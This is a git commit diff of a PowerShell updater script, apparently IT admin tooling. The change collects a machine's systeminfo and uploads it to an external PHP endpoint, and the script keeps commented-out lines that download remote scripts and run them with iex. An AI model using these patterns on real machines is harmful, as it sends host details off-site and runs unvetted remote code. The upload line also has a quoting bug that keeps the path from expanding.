bfb8b11d0781ccdfd65b0f0898e6dd63a5901748
jeremiassamuelzitnik <69435115+jeremiassamuelzitnik@users.noreply.github.com>
2023-07-01 15:34:14 -0300

    Update Actualizar.ps1

--- Actualizador/Actualizar.ps1
+++ Actualizador/Actualizar.ps1
@@ -1,8 +1,8 @@
 #Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
 #choco install clickpaste -y
 #choco install everything -y
-systeminfo > "$env:public\desktop\$env:computername.log"
-cmd /c Wmic product where name "forticlient" call uninstall
+systeminfo > "$env:temp\$env:computername.log"
+(New-Object System.Net.WebClient).UploadFile('https://www.mistrelci.com.ar/Script/upload.php','$env:temp\$env:computername.log')
 #powershell "iwr -useb https://raw.githubusercontent.com/jeremiassamuelzitnik/Updater/main/Instalador/Instalar.ps1 | iex" 
 #get-wuinstall -MicrosoftUpdate -install -AcceptAll -IgnoreReboot | Out-File $env:public\desktop\acta-$env:computername.log
 
